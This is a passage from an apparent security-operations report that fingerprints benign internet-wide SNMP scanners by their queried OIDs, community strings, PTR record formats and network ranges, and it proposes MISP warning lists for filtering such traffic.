| |1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0 |
| public | 1.3.6.1.2.1.1.1.0 | 1|
||1.3.6.1.2.1.1.2.0||
||1.3.6.1.2.1.1.3.0||
||1.3.6.1.2.1.1.4.0||
||1.3.6.1.2.1.1.5.0||
||1.3.6.1.2.1.1.6.0||
||1.3.6.1.2.1.1.7.0 |  |
| public | 1.3.6.1.2.1.1.1.0 |2|
||1.3.6.1.2.1.1.2.0
||1.3.6.1.2.1.1.3.0|
||1.3.6.1.2.1.1.4.0|
||1.3.6.1.2.1.1.5.0|
||1.3.6.1.2.1.1.6.0|
||1.3.6.1.2.1.1.7.0 | 2 |
| public | 1.3.6.1.2.1.1.1.0 | 1 |
| public | 1.3.6.1.2.1.1.1.0 | 2 |
| *empty*  |  | 2 |
| *not visible*  |       | 3 |

Interesting enought, it scan with the community "a" for Cable Television Laboratories devices. This OID is working for Cable model like ARRIS (formerly Motorola Broadband). This specific OID typically corresponds to docsIfDownChannelFrequency (downstream frequency in Hz)

More commonly Internet Census scan for device basic information in both snmp v1 and v2;
 
- 1.3.6.1.2.1.1.1.0 – sysDescr: full device description (model, OS, firmware).
- 1.3.6.1.2.1.1.2.0 – sysObjectID: vendor/device identifier OID.
- 1.3.6.1.2.1.1.3.0 – sysUpTime: time since last reboot.
- 1.3.6.1.2.1.1.4.0 – sysContact: admin contact information.
- 1.3.6.1.2.1.1.5.0 – sysName: device hostname.
- 1.3.6.1.2.1.1.6.0 – sysLocation: device physical location.
- 1.3.6.1.2.1.1.7.0 – sysServices: service layers provided by the device.

Besides OIDs requests, we identified in our dataset 440 different IP's with a internet-census.org related PTR record that resolve to unique ptr.

This are examples of the PTR format;  
- sh-chi-us-gp1-wk103b.internet-census.org  
- sh-ams-nl-gp1-wk140d.internet-census.org  
- sh-phx-us-gd10-wk102b.internet-census.org  
- zl-lax-us-gp1-wk132d.internet-census.org  
- zl-laxd-us-cpp-wk111.internet-census.org  
- zl-laxd-us-gp1-wk133b.internet-census.org  
- zl-amsc-nl-gp6-wk117d.internet-census.org  
- zl-dala-us-gp1-wk119a.internet-census.org  

Contrary to others commercial scanners PTR, a direct resolution of the PTR gives back the IP of the host. All theses IP are located in 2 distinct AS

| AS | Network| AS Name  |
|:-|----|----|
| 21859|109.105.209.0/24|ZEN-ECN |
| 21859|109.105.210.0/24|ZEN-ECN |
| 21859|45.156.131.0/24|ZEN-ECN |
| 21859|185.180.141.0/24|ZEN-ECN |
| 21859|185.226.196.0/24|ZEN-ECN |
| 21859|185.226.197.0/24|ZEN-ECN |
| 211680|45.156.128.0/24|AS-BITSIGHT |
| 211680|45.156.129.0/24|AS-BITSIGHT |
| 211680|45.156.130.0/24|AS-BITSIGHT |
| 211680|185.180.140.0/24|AS-BITSIGHT |

#### Binaryedge
BinaryEdge is a Swiss-based cybersecurity company specializing in Internet-wide scanning and threat intelligence. It was acquired by Coalition, Inc. in 2020, and its technology has since been integrated into Coalition’s cyber-risk platform. 

Binary edge scan for the following

| Community | OID | Version|
| -------- | -------- | -------- |
| public   |1.3.6.1.2.1.1.5.0|       1|
|  *not visible*     | |3|
   
The SNMP v1 MIB is sysDescr, An administratively-assigned name for managed node. By convention, this is the node's fully-qualified domain name. If the name is unknown, the value is the zero-length string. 

The PTR records give interisting informations to the locations on the scanners.

* prod-beryllium-us-west-102.li.binaryedge.ninja 
* dev-meitnerium-us-west-14.li.binaryedge.ninja 
* prod-mercury-us-southeast-0.li.binaryedge.ninja 
* prod-meitnerium-us-sfo2-351.do.binaryedge.ninja 
* prod-beryllium-nyc1-104.do.binaryedge.ninja 


| net24 | as_name | as_number |
|:-|:-|-:|
| 104.248.79.0/24 | DIGITALOCEAN-ASN | 14061 |
| 134.209.48.0/24 | DIGITALOCEAN-ASN | 14061 |
| 159.65.106.0/24 | DIGITALOCEAN-ASN | 14061 |
| 161.35.100.0/24 | DIGITALOCEAN-ASN | 14061 |
| 165.22.179.0/24 | DIGITALOCEAN-ASN | 14061 |
| 167.172.121.0/24 | DIGITALOCEAN-ASN | 14061 |
| 167.99.224.0/24 | DIGITALOCEAN-ASN | 14061 |
| 173.230.156.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 173.255.193.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 173.255.221.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 192.155.81.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 192.155.84.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.33.118.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.33.60.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.33.63.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.56.109.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.56.127.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.56.66.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.79.67.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 45.79.81.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 50.116.45.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 69.164.201.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 69.164.205.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 96.126.112.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |
| 97.107.131.0/24 | AKAMAI-LINODE-AP Akamai Connected Cloud | 63949 |


#### [ShadowForce](https://shadowforce.io/)  
Shadowforce belongs to the cyber-threat intelligence division of Baffin Bay Technologies, a subsidiary of Mastercard, which operates a global sensory network to collect and analyze malicious IP addresses and threat signals to support enterprise threat-protection services.  

ShadowForce scans only for SNMP v1 for the MIB sysDescr which is a textual description of the entity. This value should include the full name and version identification of the system's hardware.

| community | oids | version |
|:----|:----|----:|
| public | 1.3.6.1.2.1.1.1.0 | 1 |

We found out 313 IP and related PTR. The format of the PTR seems to be [name]-[id].scan.shadowforce.io. Only 3 sci-fy related name seems to be used.

Some examples;  

- decard-100.scan.shadowforce.io 
- decard-101.scan.shadowforce.io 
- decard-102.scan.shadowforce.io 
- trinity-101.scan.shadowforce.io 
- trinity-102.scan.shadowforce.io 
- trinity-103.scan.shadowforce.io 
- morpheus-224.scan.shadowforce.io 
- morpheus-228.scan.shadowforce.io 
- morpheus-229.scan.shadowforce.io 

All these 313 IPs are originating from AS208583 (SHADOWFORCE Data Acquisition and Threat Research) on the following ranges;

- 192.165.198.0/24
- 193.181.177.0/24
- 193.235.193.0/24


#### [driftnet.io](https://internet-measurement.com/)  
Driftnet is a cybersecurity company based in the United Kingdom. It provides internet-wide intelligence by continuously mapping and monitoring digital footprints.


| community | oids | version |
|:-----|:-----|-----:|
| public | 1.3.6.1.2.1.1.5.0 | 2 |
| *not visible*  |  | 3 |

Driftnet only query in SNMP v2 and v3. The SNMP v2 MIB is sysDescr, An administratively-assigned name for this managed node. 

We determined that driftnet bots are using a PTR record related to monitoring.internet-measurement.com and cencus.internet-measurement.com 

Exerpt of records;

- adored.monitoring.internet-measurement.com 
- excellent.monitoring.internet-measurement.com 
- reverent.monitoring.internet-measurement.com 
- merciful.census.internet-measurement.com 
- felicitous.census.internet-measurement.com 
- terrific.census.internet-measurement.com 

We identified 504 IP addresses and corresponding PTR records, all of which belong to their own AS, AS211298 (Driftnet). The monitoring hosts reside within the 87.236.176.0/24 range, whereas the census hosts are located in the 193.163.125.0/24 range.

#### [Modat.io](https://www.modat.io/)

We identified 12 hosts from modat.io. All belowing to two network; OVH AS16276 or NEWVM AS201401. The PTR records includes the originating AS and have the following format;

| PTR  | AS Name | AS Number |
| -------- | -------- | -------- |
|o37.scanner.modat.io') | OVH | 16276 |
|o16.scanner.modat.io') | OVH | 16276 |
|n30.scanner.modat.io') | NEWVM-AS | 201401 |
|n31.scanner.modat.io') | NEWVM-AS | 201401 |

It is not possible to determine the requested query since Modat only issue a SNMP v3 query.

| community | oids | version |
|:----|:---|---:|
| *not visible* |  | 3 |


#### [Shadowserver](https://www.shadowserver.org/)  

Shadowserver is a nonprofit security organization that operates a global sensor network to collect, analyze, and report malicious internet activity.It provides large-scale threat-intelligence data to governments, CERTs, and enterprises to support coordinated cyber-defense efforts.

According to our dataset, Shadowserver use 465 Ip's.
All PTR follows the following of nomenclature scan-[id].shadowserver.org. Where [id] coud be in many format like;

- scan-21.shadowserver.org 
- scan-21a.shadowserver.org 
- scan-60-0.shadowserver.org 
- scan-57e.shadowserver.org 

All given DNS records points back to the PTR one.
```
$ dig +short -x  184.105.247.247
247.192-26.247.105.184.in-addr.arpa.
scan-21a.shadowserver.org.
$ dig +short scan-21a.shadowserver.org
184.105.247.247
```

ShadowServer issue the following queries.
| community | oids | version |
|:----|:----|----:|
| public | 1.3.6.1.2.1.1.5.0 | 1 |
| public | 1.3.6.1.2.1.1.1.0 | 2|
||1.3.6.1.2.1.1.3.0 ||
||1.3.6.1.2.1.4.3.0 ||
||1.3.6.1.2.1.4.10.0 |  |
| *not visible* |  | 3 |

The SNMP v1 MIB is 1.3.6.1.2.1.1.5.0 which is sysName. It should return the system’s configured hostname, representing its administratively assigned network name.

In Snmp v2 the following OID are requested

- 1.3.6.1.2.1.1.1.0 – sysDescr: high-level textual description 
of the device (hardware, OS, and software version).
- 1.3.6.1.2.1.1.3.0 – sysUpTime: time elapsed since the device last initialized or rebooted.
- 1.3.6.1.2.1.4.3.0 – ipInReceives: total number of IP datagrams received, including those with errors.
- 1.3.6.1.2.1.4.10.0 – ipInDelivers: number of IP datagrams successfully delivered to upper-layer protocols.

#### [NetSecScan](http://netsecscan.net/)  

NetSecScan claims to be a non-malicious academic scanning engine. However the filiation it is not clearly explained.

![NetSecScan home page](http://hdoc.csirt-tooling.org/uploads/upload_4b60b6180dc3f4e287203c3cc807fa0c.png)

According to our data set, NetSecScan use 16 IP and one PTR netsecscan.net, all located in the range 89.248.167.0/24  for AS 202425 INT-NETWORK which seems located in netherland.

More uncommon, this scanner seems to request in SNMP v2 the root oid 1.3 (iso.org)

| community | oids | version |
|:----|:---|----:|
| public | 1.3 | 2 |

#### [Strechoid](https://stretchoid.com)  

Strechoid.com appear to be an obscur observed network scanner; it has a very low trust rating (10/100 according to  ScamMinder) and is flagged by multiple sources as conducting unexpected scans or crawls without a clear purpose. Adding to this the opt-out page forme does not seems to validate any fields except the CIDR ranges.

![Strechoid home page](http://hdoc.csirt-tooling.org/uploads/upload_ca334d189fa5861cc6f88526765bd82d.png)


According to our analysis we found 343 different IP and related PTR in the following format;

- azpdesq2p3jd.stretchoid.com
- azpdcs88zxbb.stretchoid.com 
- azpdcsypblgq.stretchoid.com 
- azpdcg1tehht.stretchoid.com 

The string "azpd" appears to be invariant and may be associated with the underlying Azure infrastructure. The corresponding IP addresses are in fact allocated to the Microsoft Azure network (MICROSOFT-CORP-MSN-AS-BLOCK, AS8075).

Stretchoid try only the following request in v1 and v3. 

| community | oids | version |
|:----|:----|----:|
| public | 1.3.6.1.2.1.1.1.0 | 1 |
|*not visible*  |  | 3 |

1.3.6.1.2.1.1.1.0 is sysDescr, a high-level textual description of the device (hardware, OS, and software version).

#### Internettl  

Internettl.org is a domain registered in December 2018 and currently using privacy-protected WHOIS information. We did know to which companies it may be linked.

We determined that Internettl operates 61 IP addresses, each resolving to a single PTR record, internettl.org. All of these IP addresses fall within the 104.152.52.0/24 range and are announced by AS14987, which is operated by the U.S.-based provider Rethem Hosting.

Internettl issues queries for both sysDescr, which provides a descriptive identification of the managed node, and sysName, which returns the system’s administratively assigned hostname.

|community | oids | version |
|:---|:---|---:|
| public | 1.3.6.1.2.1.1.1.0 | 1 |
|| 1.3.6.1.2.1.1.5.0|  |
|*not visible*  |  | 3 |


\pagebreak
# Conclusions

This analysis provides valuable insights and constitutes a meaningful contribution to operational security practice. The newly derived [MISP warning lists](https://github.com/MISP/misp-warninglists)[^misp] offer SOC operators additionnal classification mechanisms that help reduce operational fatigue by filtering out predictable or low-value SNMP scanning activity. At the same time, the  characterization of SNMP traffic enables analysts to better understand protocol behaviors and to discriminate between benign background scanning and events that warrant closer investigation. Together, these outcomes strengthen the operator’s ability to prioritize relevant signals and maintain effective situational awareness.

\pagebreak


# References 
[restena]: [https://restena.lu/en/project/ngsoti](https://restena.lu/en/project/ngsoti) Ngsoti project overview
[canon]: [https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html](https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html) Default SNMP configuration
[ipasn]: [https://github.com/D4-project/IPASN-History](https://) CIRCL D4 project IPASN-History  
[canon]: [https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html](https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html) Default SNMP configuration
[cisco]: [Cisco](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/7282-12.html)[^cisco] devices management documenation. 
[oid]: [Device information gathering](https://support.huawei.com/enterprise/en/doc/EDOC1100126900/861a99d5/obtaining-device-information-through-snmp-get) Obtaining Huawei device information.
[mikrotik]: [Mikrotik](https://fossies.org/linux/opennms/features/enlinkd/tests/src/test/resources/linkd/nms102/mikrotik-192.168.0.1-walk.txt) Mikrotik SNMP Walk sample
[vt]: [VirusTotal](https://www.virustotal.com/gui/file/aa518f13570fa2eec0fc3a4dd5ff0a7438fff5491d6e0650c94520651b02f456/content) Second stages dropper.
[rondodox]:[Rondodox](https://www.trendmicro.com/en_us/research/25/j/rondodox.html) Rondodox campaing
[nessus]:[Nessus](https://www.tenable.com/products/nessus) Scanner
[^mispwl]: [Misp](https://github.com/MISP/misp-warninglists) Mips Warning lists

--------

[^restena]: [https://restena.lu/en/project/ngsoti](https://restena.lu/en/project/ngsoti) Ngsoti project overview
[^canon]: [https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html](https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html) Default SNMP configuration
[^ipasn]: [https://github.com/D4-project/IPASN-History](https://) CIRCL D4 project IPASN-History  
[^canon]: [https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html](https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html) Default SNMP configuration
[^cisco]: [Cisco](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/7282-12.html)[^cisco] devices management documenation. 
[^oid]: [Device information gathering](https://support.huawei.com/enterprise/en/doc/EDOC1100126900/861a99d5/obtaining-device-information-through-snmp-get) Obtaining Huawei device information.
[^mikrotik]: [Mikrotik](https://fossies.org/linux/opennms/features/enlinkd/tests/src/test/resources/linkd/nms102/mikrotik-192.168.0.1-walk.txt) Mikrotik SNMP Walk sample
[^vt]: [VirusTotal](https://www.virustotal.com/gui/file/aa518f13570fa2eec0fc3a4dd5ff0a7438fff5491d6e0650c94520651b02f456/content) Second stages dropper.
[^rondodox]:[Rondodox](https://www.trendmicro.com/en_us/research/25/j/rondodox.html) Rondodox campaing
[^nessus]:[Nessus](https://www.tenable.com/products/nessus) Scanner
[^mispwl]: [Misp](https://github.com/MISP/misp-warninglists) Mips Warning lists
